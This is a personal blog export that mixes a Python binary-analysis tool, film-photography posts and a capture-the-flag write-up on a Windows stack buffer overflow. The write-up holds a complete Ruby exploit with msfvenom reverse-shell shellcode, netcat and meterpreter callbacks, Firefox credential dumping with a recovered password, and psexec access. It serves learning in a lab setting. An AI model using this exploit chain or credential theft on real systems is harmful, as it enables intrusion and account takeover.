print(f\u0026#34;{func[\u0026#39;address\u0026#39;]}: {func[\u0026#39;name\u0026#39;]}\u0026#34;) # searches for specific function in json data file by address or name def search_function(): json_data = read_json_file(DATA_FILE) func_addr_name = input(\u0026#34;enter a function address or name: \u0026#34;) found = False for func in json_data: if func[\u0026#34;address\u0026#34;] == func_addr_name or func[\u0026#34;name\u0026#34;] == func_addr_name: print(f\u0026#34;found {func[\u0026#39;address\u0026#39;]}: {func[\u0026#39;name\u0026#39;]}\u0026#34;) found = True break if not found: print(f\u0026#34;could not find function with address or name \u0026#39;{func_addr_name}\u0026#39;.\u0026#34;) # main entry point # handles cli args and calls corresponding functions def main(): # check if correct number of args are passed if len(sys.argv) == 2: command = sys.argv[1] # execute function based on arg if command == \u0026#34;search\u0026#34;: main_search_code() elif command == \u0026#34;remove-safe\u0026#34;: remove_safe_functions() elif command == \u0026#34;combine\u0026#34;: combine_data_for_same_function() elif command == \u0026#34;list\u0026#34;: list_functions() else: logging.error(\u0026#34;unknown command. please enter a valid option.\u0026#34;) sys.exit(1) else: logging.error(\u0026#34;incorrect number of args.\u0026#34;) sys.exit(1) # run script only if script is executed as main program if __name__ == \u0026#34;__main__\u0026#34;: main() analysis the script is great for quickly sifting through binaries to identify potential vulnerabilities.\nrun python gdbExtract.py search to extract a comprehensive list of functions from the binary. running python gdbExtract.py remove-safe afterwards will filter out the \u0026ldquo;known\u0026rdquo; safe functions, narrowing the focus toward more critical areas. extracted data might look something like this.\n[ { \u0026#34;address\u0026#34;: \u0026#34;0x00401350\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;main\u0026#34;, \u0026#34;signature\u0026#34;: \u0026#34;int main()\u0026#34; }, { \u0026#34;address\u0026#34;: \u0026#34;0x00401390\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;helper_function\u0026#34;, \u0026#34;signature\u0026#34;: \u0026#34;void helper_function(int)\u0026#34; } ] reverse engineering it can also dissect a binary so the user can understand its behavior or uncover hidden functionalities.\nafter extracting function data, run python gdbExtract.py combine to identify duplicate functions, which might indicate areas of complexity or reuse of code worth exploring.\n{ \u0026#34;helper_function\u0026#34;: { \u0026#34;addresses\u0026#34;: [\u0026#34;0x00401390\u0026#34;, \u0026#34;0x00401500\u0026#34;], \u0026#34;signature\u0026#34;: \u0026#34;void helper_function(int)\u0026#34;, \u0026#34;count\u0026#34;: 2 } } education it can aid instructors or teachers in explaining the structure and intricacies of binaries in a practical manner.\nrun python gdbExtract.py list to explore the different functions within a binary. the output can look something like this.\n0x00401350: main 0x00401390: helper_function run python gdbExtract.py find to search for specific functions. this can demonstrate how functions relate to each other. enter a function address or name: main found 0x00401350: main corner cases every tool has its limitations. gdbExtract might not effectively parse binaries that utilize heavily obfuscated code. also, its reliance on GDB means it inherits any limitations present within GDB, such as handling certain types of binaries or specific configs.\nthought experiment let\u0026rsquo;s say i\u0026rsquo;m a security researcher (i am lol), and i want to assess the security of a legacy communications software that my organization has been using for over a decade. i suspect that the software might contain undiscovered vulnerabilities.\nrunning the script i quickly run python gdbExtract.py search to analyze the binary (specified in BINARY_PATH). it will output a comprehensive list of all functions within the binary, complete with their memory addresses and signatures. i now have a clear and structured overview of the binary\u0026rsquo;s functions + hours of saved time. filtering safe functions run python gdbExtract.py remove-safe to streamline the dataset. this will isolate functions that warrant closer scrutiny. it filters out functions that were pre-identified as \u0026ldquo;safe\u0026rdquo;, based on individual critieria (in this case, i\u0026rsquo;ve excluded standard library functions and those without direct external input handling). i now have a manageable list of functions that are labeled \u0026ldquo;high-risk\u0026rdquo; (related to network data handling, memory manipulation, etc). identification i come across a function called processClientRequest. this function handles incoming data packets from network clients, interacting directly with external data. diving into the source code of the processClientRequest function, i discover that it uses strcpy to data from the network buffer to a local buffer. this is an immediate red flag, as strcpy doesn\u0026rsquo;t check the size of the destination buffer, making it vulnerable to buffer overflow attacks if the source data exceeds the buffer\u0026rsquo;s capacity. even worse, processClientRequest lacked any checks on the size of the incoming data, meaning it blindly copied whatever was sent over the network into the local buffer.\nconstructing a proof-of-concept i create a network packet with data significantly larger than the buffer size inside the processClientRequest function (have it contain a specific pattern that\u0026rsquo;s easily identifiable in the memory if it overflows, like AAAAAAAA). i then send the packet to a controlled environment (VM) using the legacy software and monitor the memory state of the software as it processes the packet (Immunity Debugger is great for this). as expected, the packet causes a buffer overflow and overwrites the adjacent memory. this can be confirmed by checking for the pattern in memory locations outside the buffer. the packet can be modified to include a simple payload that would then write itself into the program memory. remediation replace strcpy with strncpy, which includes buffer size as an argument, ensuring copied data does not exceed buffer limit. use checks to validate the size of incoming data before processing it. review the code with the help of 1 or more code reviewers, and test it using various packet sizes. hope this tool finds you well! feel free to leave comments on my github and explore some of my other programs as well.\n","date":"2023-11-27","permalink":"//localhost:1313/posts/gdbextract/","section":"","summary":"","tags":[],"title":"gdbExtract"},{"categories":[],"contents":"this was my first roll of black + white film. i have to say, i had a lot of fun shooting with it because i wasn\u0026rsquo;t preoccupied with colour and got to focus instead on the moods and shadows of the shots.\npeople here\u0026rsquo;s my friend sib, writing a message to his friend.\nmy girlfriend joey.\nevents these next few shots are from a protest in toronto. thousands of people had gathered to speak out against the horrific crimes of the zionist occupation of palestine.\nthe city toronto looks really nice in BW. parts of the city are already quite grim, but on a sunny day the images look particularly striking.\n","date":"2023-11-13","permalink":"//localhost:1313/photography/new_post/","section":"","summary":"","tags":[],"title":"tri-x 400"},{"categories":[],"contents":"portra 800 is probably my favourite film to shoot with. once i\u0026rsquo;d gotten comfortable enough with the gold 200, i wanted to elevate my colour game with a more light sensitive film and this one is definitely up there.\npeople some shots of friends: sib + kubba, hyder, nisan, and natasha.\nbonus one of joey. it came out a bit dark, but i kind of like it. also found this one i took of sib having a smoke on a rainy day. blurry but not terrible.\nplaces i went for a walk in the east end of toronto, along gerrard st.\nevents here are a few more shots from another march against israel.\n","date":"2023-11-10","permalink":"//localhost:1313/photography/new_post2/","section":"","summary":"","tags":[],"title":"portra 800"},{"categories":[],"contents":"more work with the gold 200, my first and favourite film (until i discovered portra 800 at least).\nwrapping up the month of october. warm, sunny days and the leaves just starting to change.\n","date":"2023-10-26","permalink":"//localhost:1313/photography/new_post3/","section":"","summary":"","tags":[],"title":"gold 200"},{"categories":[],"contents":"the last roll of the manitoba trip. even though it\u0026rsquo;s a technically \u0026ldquo;inferior\u0026rdquo; film, i still love the gold 200 and these shots are some of my favourites.\n","date":"2023-09-10","permalink":"//localhost:1313/photography/new_post6/","section":"","summary":"","tags":[],"title":"gold 200"},{"categories":[],"contents":"second roll for the manitoba trip. first time shooting with the portra 800, and it turned out great (even if some shots are blurry).\n","date":"2023-09-09","permalink":"//localhost:1313/photography/new_post5/","section":"","summary":"","tags":[],"title":"portra 800"},{"categories":[],"contents":"first time shooting with ultramax 400. the colours seem a little cooler than the gold 200, and definitely not as rich as the portra 800, but i do like the \u0026ldquo;real\u0026rdquo; feel of some of these photos.\nit was also the first of 3 rolls i took along with me on my trip to manitoba, so the photos are a mix of toronto and manitoba scenes.\n","date":"2023-09-08","permalink":"//localhost:1313/photography/new_post4/","section":"","summary":"","tags":[],"title":"ultramax 400"},{"categories":[],"contents":"still practicing. stuck with the gold 200 because it\u0026rsquo;s a low-cost film, and nice for summer days.\n","date":"2023-07-25","permalink":"//localhost:1313/photography/new_post7/","section":"","summary":"","tags":[],"title":"gold 200"},{"categories":[],"contents":"my first ever roll of film + my first ever analog camera. during the summer, i became increasingly disillusioned with our (my) over-dependence on technology, especially given both my career and hobbies are steeped in digitalia. i decided to shoot film, and was able to find a great deal for an intermediate analog camera: the Asahi Pentax Spotmatic SPII. with it came 3 lenses: a 35mm Zeiss Zebra, a 55m SMC Takumar (pictured), and a 135mm long.\ni fell in love with it immediately, and started shooting. the great (and maybe frustrating) thing about shooting film is the most obvious: you have no idea it\u0026rsquo;s going to turn out until you scan. so i spent a lot of time trying to understand the basics: aperture, shutter speed, ISO, focal distance, etc. i tried to be as intentional as possible when shooting, as opposed to the rapid fire nature of digital, phone photography.\n","date":"2023-07-12","permalink":"//localhost:1313/photography/new_post8/","section":"","summary":"","tags":[],"title":"intro + gold 200"},{"categories":[],"contents":"lately, i\u0026rsquo;ve been getting more and more into reverse engineering executable programs and using them to gain control of a target machine. it brings to mind what i learned in \u0026ldquo;microcontrollers and microprocessors\u0026rdquo;, a really interesting but tough course i took in my 3rd year of electrical engineering. the course dealt with low-level computing, mainly assembly language (aka ASM), and how it\u0026rsquo;s used to communicate directly with computer architecture and control the usage of memory, on a hardware level. understanding memory usages and allocations on that level paved the way for utilizing buffer overflows, a very popular attack that is a result of reverse engineering.\nwhat exactly is a buffer overflow? well, what is a buffer? buffers are memory storage regions that temporarily hold data while it is transferred from one location to another. a buffer overflow happens when the volume of the data exceeds the storage capacity of the buffer. what happens then is the program, trying to write the data to the desired buffer, overwrites adjacent memory locations (blocks).\ntake a buffer for a password that allows a user to log-in to an application. let\u0026rsquo;s say the buffer is designed for an input of 8 bytes. if an input of 10 bytes is received, the program may write the excess data past the buffer boundary.\nhow can buffer overflows be used as attacks? if buffer overflows can force some programs to write to adjacent memory blocks, it follows that an attacker can provide a large input that would force the program to write \u0026ldquo;bad\u0026rdquo; code to those blocks. a buffer overflow would change the execution path of the program, and the attacker can force the program and the target machine to execute a desired payload.\nto do this, attackers would need to know the memory layout of a program and details of the buffer, so that they could effectively abuse the storage capacity of the buffer and overwrite areas that also hold executable code. an example of this is overwriting a pointer (an object that points to another area in memory) and point it to a payload.\nthere are 2 types of buffer overflow attacks. the first, and most common, is stack-based buffer overflow. these leverage stack memory that only exists during the runtime of a function or program.\nthe second, less common as it\u0026rsquo;s more difficult to carry out, is a heap-based buffer overflow. these involve flooding the memory space allocated for a program beyond memory used for current runtime operations.\nhow can developers prevent buffer overflows? on a code level, devs can prevent buffer overflows by implementing security measures directly inside the code or by using languages that offer built-in protection (like perl, java, javascript, c#).\non an OS level, runtime protection measures can help thwart buffer overflows.\naddress space randomization (ASLR): since buffer overflows require locations of executable code, randomizing address spaces would make this near impossible to carry out. data execution prevention: this flags certain areas of memory as executable or non-executable, and would thus stop an attack from running code in a non-executable region. structured exception handler overwrite protection (SEHOP): structured exception handling (SEH) is a built-in system that manages software and hardware exceptions. SEHOP stops malicious code from attacking structured exception handling and thus prevents an attacker from using the SEH overwrite technique. SEH overwrites are achieved using a stack-based buffer overflow to overwrite an exception registration record, stored on a thread\u0026rsquo;s stack. gatekeeper i found this really cool challenge made by an acquaintance, which utilizes a stack-based buffer overflow as a central technique to collect the flags on a target machine. there is no further information provided, which made this challenge one of the most intense and interesting ones i\u0026rsquo;ve cracked so far.\nupon getting my tun0 address (10.18.12.60) and the target\u0026rsquo;s address (10.10.10.172), i performed an nmap scan.\nnmap 10.10.10.172 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 15:47 EDT Nmap scan report for 10.10.90.136 Host is up (0.14s latency). Not shown: 989 closed ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 31337/tcp open Elite 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49161/tcp open unknown 49165/tcp open unknown drilling down on the open ports with a more specific nmap scan:\nnmap -p135,139,445,3389,31337 -A 10.10.10.172 right away, i can identify an SMB service running on port 445. the next step should be second nature at this point: enumerate the SMB shares.\nsmbclient -L 10.10.10.172 although this command can yield some decent information, i\u0026rsquo;ve recently come to prefer using nmap to execute an SMB enumeration script:\nnmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.172 PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-enum-shares: | account_used: guest | \\\\10.10.10.172\\ADMIN$: | Type: STYPE_DISKTREE_HIDDEN | Comment: Remote Admin | Anonymous access: \u0026lt;none\u0026gt; | Current user access: \u0026lt;none\u0026gt; | \\\\10.10.10.172\\C$: | Type: STYPE_DISKTREE_HIDDEN | Comment: Default share | Anonymous access: \u0026lt;none\u0026gt; | Current user access: \u0026lt;none\u0026gt; | \\\\10.10.10.172\\IPC$: | Type: STYPE_IPC_HIDDEN | Comment: Remote IPC | Anonymous access: READ | Current user access: READ/WRITE | \\\\10.10.10.172\\Users: | Type: STYPE_DISKTREE | Comment: | Anonymous access: \u0026lt;none\u0026gt; |_ Current user access: READ the \u0026ldquo;users\u0026rdquo; share looks interesting, so i logged into it:\nsmbclient \\\\\\\\10.10.10.172\\\\Users upon executing dir, i see there\u0026rsquo;s a file called \u0026ldquo;gatekeeper.exe\u0026rdquo;. to download it to my local machine, i simply execute smbget smb://10.10.10.172/Users/Share/gatekeeper.exe\nat this point, i fire up a windows VM i\u0026rsquo;d created for the purposes of reverse engineering and creating proof-of-concepts for buffer overflow attacks. i then transfer \u0026ldquo;gatekeeper.exe\u0026rdquo; to my windows VM using the python simplehttpserver. once it\u0026rsquo;s downloaded to my windows machine, i open and run it in immunity debugger, a powerful application used to analyze malware and reverse engineer binary files.\nbefore i do anything else with immunity debugger, i need to find the port that gatekeeper is running on. inside the windows command prompt, i first find the process ID (PID) of the program and then use that to find the port.\ntasklist | findstr gatekeeper.exe netstat -aon | findstr 5148 the program is running on port 31337.\nnow that we know which port the program is running on, and while it\u0026rsquo;s running inside immunity debugger (which will delineate all the memory operations of the program), i return to my kali machine to create a simple exploit that will supply gatekeeper with my inputs. if the program successfully receives my input, i\u0026rsquo;ll then try to crash it with a large string and if that also works, i\u0026rsquo;ll work on a proper payload that will not only break the program but force it to execute my exploit in adjacent memory.\ni prefer writing overflow exploits in ruby (it\u0026rsquo;s a fun new language that i\u0026rsquo;ve been learning), so for the simple exploit i\u0026rsquo;ll use a runtime dev console called pry. this can be run directly inside the terminal.\npry --simple-prompt \u0026gt;\u0026gt; require \u0026#34;socket\u0026#34; \u0026gt;\u0026gt; s=TCPSocket.new(\u0026#34;192.168.100.4\u0026#34;,31337) \u0026gt;\u0026gt; s.puts \u0026#34;hello\u0026#34; this little piece of code opens a socket to the program running in windows (addressed at 192.168.100.4) on port 31337. it then \u0026ldquo;puts\u0026rdquo; a string (hello) as the input.\nthe program received our 6 bytes of input. now i\u0026rsquo;m going to try and crash it. instead of \u0026ldquo;hello\u0026rdquo;, i\u0026rsquo;ll send a string of As. 200 of them, to be exact.\npry --simple-prompt \u0026gt;\u0026gt; require \u0026#34;socket\u0026#34; \u0026gt;\u0026gt; s=TCPSocket.new(\u0026#34;192.168.100.4\u0026#34;,31337) \u0026gt;\u0026gt; s.puts \u0026#34;A\u0026#34;*200 the program crashed, which means buffer overflow is possible!\nto do this, i need to calculate something called the \u0026ldquo;EIP offset\u0026rdquo;. EIP stands for extended instruction pointer, and it tells the computer where to go to execute the next command. it basically controls the flow of a program. the EIP offset is then the exact number of bytes in the payload after which the EIP gets overwritten. to find the EIP offset, i\u0026rsquo;ll first create a string with which to crash the program, and then observe the EIP in immunity debugger.\nmsf-pattern_create -l 200 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag i\u0026rsquo;ll paste this string (200 characters long) into the pry:\npry --simple-prompt \u0026gt;\u0026gt; require \u0026#34;socket\u0026#34; \u0026gt;\u0026gt; s=TCPSocket.new(\u0026#34;192.168.100.4\u0026#34;,31337) \u0026gt;\u0026gt; s.puts \u0026#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\u0026#34; the EIP is pointed at 39654138. i can use this to find the offset:\nmsf-pattern_offset -l 2500 -q 39654138 exact match at offset 146 to verify this offset value, i\u0026rsquo;ll create an input that will enter A for the first 146 bytes, and then B for the next 4.\npry --simple-prompt \u0026gt;\u0026gt; require \u0026#34;socket\u0026#34; \u0026gt;\u0026gt; s=TCPSocket.new(\u0026#34;192.168.100.4\u0026#34;,31337) \u0026gt;\u0026gt; s.puts \u0026#34;A\u0026#34;*146+\u0026#34;B\u0026#34;*4 the EIP is now overwritten with \u0026ldquo;42424242\u0026rdquo;, which is \u0026ldquo;BBBB\u0026rdquo; in hex.\nso, i know the program is exploitable, along with the EIP offset value. i can now write the proof-of-concept of my exploit. what i\u0026rsquo;m trying to do is not simply crash the program, but inject a payload (\u0026ldquo;shellcode\u0026rdquo;) that will spawn a reverse shell that i can then use to further exploit the target machine. the skeleton of the script, called bof.rb, looks as follows:\nbuff = \u0026#34;\\x90\u0026#34;*146 #NOP slide, forces the program to start right after the offset. buff+= \u0026#34;\u0026#34; #JMP ESP buff+= \u0026#34;B\u0026#34;*10 #additional nops for argument values buff+= \u0026#34;\u0026#34; #shellcode require \u0026#39;socket\u0026#39; TCPSocket.open(\u0026#34;\u0026lt;targetIP\u0026#34;,31337){ |s| s.puts buff} the ESP register is the stack pointer, which will execute the contents of the stack. now that i have control of the EIP register, i need it to somehow point to the ESP. this is where JMP ESP comes in. JMP ESP basically jumps to the desired ESP.\nthe shellcode section is where my payload will go. before i create a payload, i need to find the \u0026ldquo;bad characters\u0026rdquo;. certain byte characters cause issues in exploit development. a couple common bad characters are x00 (null byte: truncates the shellcode when executed) and x0a (carriage return). to find all possible bad characters, i\u0026rsquo;ll just write a list of all hex characters (excluding x00 and x0a).\nbuff+= \u0026#34;\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\u0026#34; + \u0026#34;\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; + \u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\u0026#34; + \u0026#34;\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\u0026#34; + \u0026#34;\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\u0026#34; + \u0026#34;\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\u0026#34; + \u0026#34;\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\u0026#34; + \u0026#34;\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34;\u0026#34; i\u0026rsquo;ll run the exploit using ruby bof.rb and then in immunity debugger, compare against a byte array to isolate the bad characters. note the ESP when the exploit terminates: 008D19E4.\n!mona bytearray -b \u0026#34;\\x00\\x01\\x02\\x03\\x04\u0026#34; !mona compare -f C:\\mona\\gatekeeper\\bytearray.txt 008D19E4 i used an expanded array from x00 to x04, and the results show that x0a is the first corrupted byte. that means the only bad characters i have are x00 and x0a.\nbefore i move on, i must verify if ASLR (address space randomization) is turned off. the attack will not work otherwise.\n!mona modules ASLR is set to \u0026ldquo;false\u0026rdquo;, so i can proceed with finding the JMP ESP values.\n!mona jmp -r esp -m gatekeeper.exe i get back 2 pointers: 0x080414c3 and 0x080416bf. i\u0026rsquo;ll use the former, but for my script i have to convert it to little endian format, which stores the least significant byte at the smallest memory address.\nbuff+= \u0026#34;\\xc3\\x14\\x04\\x08\u0026#34; for the actual shellcode, i\u0026rsquo;ll use msfvenom.\nmsfvenom -p windows/shell_reverse_tcp LHOST=\u0026lt;local IP\u0026gt; LPORT=4444 -f rb -b \u0026#34;\\x00\\x0a\u0026#34; the code for bof.rb is now complete!\nbuff = \u0026#34;\\x90\u0026#34;*146 #NOP slide, forces the program to start right after the offset. buff+= \u0026#34;\\xc3\\x14\\x04\\x08\u0026#34; #JMP ESP buff+= \u0026#34;B\u0026#34;*10 #additional NOPs for argument values buff+= \u0026#34;\u0026#34;\\xdb\\xc8\\xb8\\xf3\\x0f\\xd1\\xd9\\xd9\\x74\\x24\\xf4\\x5d\\x29\\xc9\u0026#34; + \u0026#34;\\xb1\\x52\\x83\\xc5\\x04\\x31\\x45\\x13\\x03\\xb6\\x1c\\x33\\x2c\\xc4\u0026#34; + \u0026#34;\\xcb\\x31\\xcf\\x34\\x0c\\x56\\x59\\xd1\\x3d\\x56\\x3d\\x92\\x6e\\x66\u0026#34; + \u0026#34;\\x35\\xf6\\x82\\x0d\\x1b\\xe2\\x11\\x63\\xb4\\x05\\x91\\xce\\xe2\\x28\u0026#34; + \u0026#34;\\x22\\x62\\xd6\\x2b\\xa0\\x79\\x0b\\x8b\\x99\\xb1\\x5e\\xca\\xde\\xac\u0026#34; + \u0026#34;\\x93\\x9e\\xb7\\xbb\\x06\\x0e\\xb3\\xf6\\x9a\\xa5\\x8f\\x17\\x9b\\x5a\u0026#34; + \u0026#34;\\x47\\x19\\x8a\\xcd\\xd3\\x40\\x0c\\xec\\x30\\xf9\\x05\\xf6\\x55\\xc4\u0026#34; + \u0026#34;\\xdc\\x8d\\xae\\xb2\\xde\\x47\\xff\\x3b\\x4c\\xa6\\xcf\\xc9\\x8c\\xef\u0026#34; + \u0026#34;\\xe8\\x31\\xfb\\x19\\x0b\\xcf\\xfc\\xde\\x71\\x0b\\x88\\xc4\\xd2\\xd8\u0026#34; + \u0026#34;\\x2a\\x20\\xe2\\x0d\\xac\\xa3\\xe8\\xfa\\xba\\xeb\\xec\\xfd\\x6f\\x80\u0026#34; + \u0026#34;\\x09\\x75\\x8e\\x46\\x98\\xcd\\xb5\\x42\\xc0\\x96\\xd4\\xd3\\xac\\x79\u0026#34; + \u0026#34;\\xe8\\x03\\x0f\\x25\\x4c\\x48\\xa2\\x32\\xfd\\x13\\xab\\xf7\\xcc\\xab\u0026#34; + \u0026#34;\\x2b\\x90\\x47\\xd8\\x19\\x3f\\xfc\\x76\\x12\\xc8\\xda\\x81\\x55\\xe3\u0026#34; + \u0026#34;\\x9b\\x1d\\xa8\\x0c\\xdc\\x34\\x6f\\x58\\x8c\\x2e\\x46\\xe1\\x47\\xae\u0026#34; + \u0026#34;\\x67\\x34\\xc7\\xfe\\xc7\\xe7\\xa8\\xae\\xa7\\x57\\x41\\xa4\\x27\\x87\u0026#34; + \u0026#34;\\x71\\xc7\\xed\\xa0\\x18\\x32\\x66\\xc5\\xce\\x30\\x4a\\xb1\\xec\\x48\u0026#34; + \u0026#34;\\xa7\\xf2\\x78\\xae\\xad\\xe4\\x2c\\x79\\x5a\\x9c\\x74\\xf1\\xfb\\x61\u0026#34; + \u0026#34;\\xa3\\x7c\\x3b\\xe9\\x40\\x81\\xf2\\x1a\\x2c\\x91\\x63\\xeb\\x7b\\xcb\u0026#34; + \u0026#34;\\x22\\xf4\\x51\\x63\\xa8\\x67\\x3e\\x73\\xa7\\x9b\\xe9\\x24\\xe0\\x6a\u0026#34; + \u0026#34;\\xe0\\xa0\\x1c\\xd4\\x5a\\xd6\\xdc\\x80\\xa5\\x52\\x3b\\x71\\x2b\\x5b\u0026#34; + \u0026#34;\\xce\\xcd\\x0f\\x4b\\x16\\xcd\\x0b\\x3f\\xc6\\x98\\xc5\\xe9\\xa0\\x72\u0026#34; + \u0026#34;\\xa4\\x43\\x7b\\x28\\x6e\\x03\\xfa\\x02\\xb1\\x55\\x03\\x4f\\x47\\xb9\u0026#34; + \u0026#34;\\xb2\\x26\\x1e\\xc6\\x7b\\xaf\\x96\\xbf\\x61\\x4f\\x58\\x6a\\x22\\x7f\u0026#34; + \u0026#34;\\x13\\x36\\x03\\xe8\\xfa\\xa3\\x11\\x75\\xfd\\x1e\\x55\\x80\\x7e\\xaa\u0026#34; + \u0026#34;\\x26\\x77\\x9e\\xdf\\x23\\x33\\x18\\x0c\\x5e\\x2c\\xcd\\x32\\xcd\\x4d\u0026#34; + \u0026#34;\\xc4\u0026#34;\u0026#34; #shellcode require \u0026#39;socket\u0026#39; TCPSocket.open(\u0026#34;10.10.10.172\u0026#34;,31337){ |s| s.puts buff} before executing this script, i\u0026rsquo;ll set up a netcat listener that can receive the reverse shell.\nnc -lvnp 4444\nif, for whatever reason, the port is clogged, i can simply hard kill the process running on it:\nkill -9 $(lsof -t -i:4444) execute the script using ruby bof.rb and a shell will have spawned in the netcat session. the flag is stored on the desktop.\na quick check of the user\u0026rsquo;s privileges shows that i don\u0026rsquo;t have any special access, so here comes the privilege escalation portion of the challenge.\ni\u0026rsquo;ll create another shellcode, but this time i want to upgrade it to a meterpreter shell.\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=\u0026lt;local IP\u0026gt; LPORT=5555 -f rb -b \u0026#34;\\x00\\x0a\u0026#34; in another terminal window, i\u0026rsquo;ll run the metasploit console to run the handler.\nrunning the exploit using exploit -j and running my overflow script on the side using ruby bof.rb, a reverse shell will be spawned. once the meterpreter shell is spawned, i\u0026rsquo;ll try to enumerate the applications on the target.\n\u0026gt; run post/windows/gather/enum_applications Installed Applications ====================== Name Version ---- ------- Amazon SSM Agent 2.3.842.0 Amazon SSM Agent 2.3.842.0 EC2ConfigService 4.9.4222.0 EC2ConfigService 4.9.4222.0 EC2ConfigService 4.9.4222.0 EC2ConfigService 4.9.4222.0 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508 14.20.27508.1 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508 14.20.27508.1 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508 14.20.27508.1 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508 14.20.27508.1 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508 14.20.27508 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508 14.20.27508 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508 14.20.27508 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508 14.20.27508 Mozilla Firefox 75.0 (x86 en-US) 75.0 i see firefox is downloaded, which means i can dump its credentials and then use firefox decrypt to decrypt them, allowing me to impersonate and log in as the target.\n\u0026gt; run post/multi/gather/firefox_creds [+] Downloaded cert9.db: /home/kali/.msf4/loot/20211021043407_default_10.10.10.172_ff.ljfn812a.cert_898397.bin [+] Downloaded cookies.sqlite: /home/kali/.msf4/loot/20211021043411_default_10.10.10.172_ff.ljfn812a.cook_582398.bin [+] Downloaded key4.db: /home/kali/.msf4/loot/20211021043414_default_10.10.10.172_ff.ljfn812a.key4_936123.bin [+] Downloaded logins.json: /home/kali/.msf4/loot/20211021043416_default_10.10.10.172_ff.ljfn812a.logi_001670.bin i have to move the files from /.msf4/ to whichever folder i\u0026rsquo;m working with, before running firefox_dcrypt. but also, before i run firefox_dcrypt, i must rename each of the \u0026ldquo;loot\u0026rdquo; files to the corresponding names:\nmv 20211021043407_default_10.10.248.88_ff.ljfn812a.cert_898397.bin cert9.db mv 20211021043411_default_10.10.248.88_ff.ljfn812a.cook_582398.bin cookies.sqlite mv 20211021043414_default_10.10.248.88_ff.ljfn812a.key4_936123.bin key4.db mv 20211021043416_default_10.10.248.88_ff.ljfn812a.logi_001670.bin logins.json running the tool, i get:\npython3 firefox_decrypt.py /home/kali/gatekeeper/firefoxcreds/loot Username: \u0026#39;mayor\u0026#39; Password: \u0026#39;8CL7O1N78MdrCIsV\u0026#39; so i have an elevated account\u0026rsquo;s credentials. i can run psexec.py (which lets me execute programs on remote systems) using these credentials, effectively granting me special access.\npython3 psexec.py mayor:8CL7O1N78MdrCIsV@10.10.10.172 as demonstrated, buffer overflows are incredibly powerful attack vectors that utilize deep understanding of how memory storage and program execution work in tandem. stopping them is not only difficult and potentially expensive, but 